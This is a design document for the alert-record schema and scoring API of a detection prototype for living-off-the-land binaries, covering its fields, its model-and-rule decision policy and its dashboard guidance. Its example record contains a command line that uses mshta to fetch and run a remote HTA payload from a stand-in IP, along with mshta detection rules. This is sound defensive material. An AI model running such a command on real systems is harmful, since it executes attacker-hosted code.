# Alert Record Schema and `score_event` Contract

**Owner:** Saif Abed (Data & ML)
**Consumers:** Hamdan Al Sabahi (Integration & quality) and Abdalrahman Ibrahim (Dashboard/UI)
**Status:** Implemented in `src/alert_scoring.py` and exposed by `api/main.py`

`score_event` combines the existing model and rule outputs into one alert record. It does not retrain anything or change a threshold.

- Module: `src/alert_scoring.py`
- Entry points: `score_event(...)`, `score_dataframe(...)`, `AlertScorer`
- CLI: `python src/alert_scoring.py --help`
- Demo output: `results/sample_alerts.json`, `results/sample_alerts.csv`
- VM output: `results/vm_alerts.json`, `results/vm_alerts.csv`

## 1. Calling the scorer

For a single event, pass a row containing the 57 model-input columns:

```python
from src.alert_scoring import score_event

alert = score_event(row)
alert = score_event(row, xgb_proba=p)  # use an existing probability instead
```

The return value is a JSON-serialisable `dict` with the fields in `ALERT_FIELDS`. The API in `api/main.py` calls this function directly, so HTTP and dashboard results use the same code path.

For batch scoring:

```python
from src.alert_scoring import score_dataframe

alerts = score_dataframe(df, proba_col="proba", label_col="true", per_outcome=8)
```

```powershell
# Balanced demo sample from saved test outcomes
python src/alert_scoring.py --input results/test_event_outcomes.csv `
    --proba-col proba --label-col true --per-outcome 8 --prefix sample_alerts

# Real adapted VM telemetry, scored with the saved XGBoost model
python src/alert_scoring.py --input data/processed/vm_adapted.parquet --prefix vm_alerts
```

Manual events from the dashboard use `score_event(row, manual=True)`. They are handled separately because hand-typed commands are out of distribution for a model trained on the synthetic data.

## 2. Fields

| Field | Type | Meaning |
|---|---|---|
| `event_id` | string | Stable event id (`record_id` when available) |
| `record_id` | string | Dataset or VM record id |
| `scenario_id` | string \| null | VM scenario id when available |
| `scored_at` | ISO-8601 string | UTC time the record was created |
| `process_name` | string | Child image basename, lowercased |
| `parent_process` | string | Parent image basename, lowercased |
| `command_line` | string | Raw command line |
| `user` | string \| null | User context when available |
| `xgb_proba` | float | XGBoost probability |
| `xgb_pred` | 0/1 | `xgb_proba >= threshold` |
| `encoder_proba` | float \| null | SecureBERT probability, if supplied |
| `model_proba` | float | Decision probability (XGBoost, or fusion when encoder output is supplied) |
| `model_pred` | 0/1 | `model_proba >= model_threshold` |
| `model_threshold` | float | Threshold used (0.55 for XGBoost) |
| `rule_matched` | bool | True if any rule matched |
| `rule_ids` | list[str] | Matched rule ids, e.g. `["RULE-MSHTA-001"]` |
| `rule_reasons` | list[str] | One readable reason per matched rule |
| `rule_attack_ids` | list[str] | ATT&CK ids from matched rules |
| `rule_severity_max` | string \| null | `low`, `medium`, `high`, or `critical` |
| `attack_techniques` | list[str] | Deduplicated ATT&CK suggestions from rules |
| `hybrid_score` | 0/1 | Final decision |
| `decision` | string | `malicious` or `benign` |
| `risk` | string | Triage band: `low`, `medium`, or `high` |
| `risk_score` | int 0-100 | Auxiliary sort score |
| `review_required` | bool | Model and rules disagree, or parent context is missing |
| `evidence` | list[str] | Short explanation lines |
| `model_version` | object | Model name, checkpoint, threshold, and rule engine |
| `scoring_policy` | string | Policy name; manual events add `+manual_calibration` |
| `disclaimer` | string | Prototype and scope note |

## 3. Decision and risk policy

- **Model arm:** XGBoost at the validation-selected threshold in `results/chosen_threshold.json` (0.55). If `encoder_proba` is provided, the validation-selected fusion in `results/fusion_config.json` is used instead (`w_xgb=0.4`, threshold 0.50).
- **Rules arm:** the deterministic E1 engine in `rules/`.
- **Hybrid decision:** `model_pred OR rule_severity_max in {high, critical}`. This is also the policy used by `src/score_vm.py`.
- **Risk band:** `low` when the hybrid decision is 0; `high` when it is 1 and either `model_proba >= 0.85` or a high/critical rule matched; `medium` otherwise.
- **Review flag:** `review_required` is set when the model and rule results disagree, when a model alert is suppressed by manual triage, or when the parent process is missing.

Manual events are banded with the rules and a small set of command indicators rather than the raw model probability alone. A strong indicator or a high/critical rule gives `high`; a weak indicator gives `medium`; otherwise the event is `low`. The raw probability is still stored in the record. This is a triage aid, not part of the offline evaluation.

Rules are evidence, not ground truth. Labels, expected techniques, and scenario answers are never used as features and do not appear in the alert record.

## 4. Example record

```json
{
  "event_id": "vm_9073f71e3991652f",
  "record_id": "vm_9073f71e3991652f",
  "scenario_id": "BEN-001",
  "scored_at": "2026-11-08T15:26:42+00:00",
  "process_name": "mshta.exe",
  "parent_process": "explorer.exe",
  "command_line": "mshta.exe http://198.51.100.7/payload.hta",
  "user": null,
  "xgb_proba": 0.971665,
  "xgb_pred": 1,
  "encoder_proba": null,
  "model_proba": 0.971665,
  "model_pred": 1,
  "model_threshold": 0.55,
  "rule_matched": true,
  "rule_ids": ["RULE-MSHTA-001"],
  "rule_reasons": ["mshta launched a script, a local .hta, or hosted content"],
  "rule_attack_ids": ["T1218.005"],
  "rule_severity_max": "high",
  "attack_techniques": ["T1218.005"],
  "hybrid_score": 1,
  "decision": "malicious",
  "risk": "high",
  "risk_score": 100,
  "review_required": false,
  "evidence": [
    "xgboost_baseline probability 0.972 (threshold 0.55) -> model_pred=1",
    "rule RULE-MSHTA-001: mshta launched a script, a local .hta, or hosted content",
    "rule severity_max=high",
    "context: mshta.exe <- explorer.exe"
  ],
  "model_version": {
    "function": "xgboost_baseline",
    "checkpoint": "xgboost_baseline",
    "threshold": 0.55,
    "rule_engine": "rules/ (deterministic Sigma-style)"
  },
  "scoring_policy": "model_or_high_severity_rule",
  "disclaimer": "Alert record from SentinelLOLBins. Risk is a triage priority, not a verdict of compromise. Rules are evidence, not ground truth. Prototype only; not an EDR replacement and not validated for enterprise deployment."
}
```

## 5. Dashboard notes

- Show `risk` as the triage badge and `decision` as a separate field. This keeps "high risk but not flagged" distinct from "flagged at medium risk".
- Useful filters: `risk`, `decision`, `scenario_id`, `rule_ids`, `attack_techniques`, and free text over `command_line` or `evidence`.
- The detail view should include `command_line`, `parent_process`, `evidence`, `rule_reasons`, `xgb_proba`, `rule_severity_max`, `attack_techniques`, and `review_required`.
- Highlight rows with `review_required`; they are the analyst-review queue.
- `results/sample_alerts.csv` and `.json` are safe demo inputs. `results/sample_alerts_meta.csv` contains expected labels and TP/FP/FN/TN for annotation only and must not be passed to scoring.

## 6. Limitations

- The VM check covered one isolated, snapshot-backed VM and only the scenarios run there. It is a sanity check, not an enterprise estimate.
- Fourteen model inputs are NaN for raw VM telemetry (see `docs/vm_missing_fields.txt`). The model accepts them, but calibration shifts.
- `attack_techniques` values are rule suggestions, not ground truth.
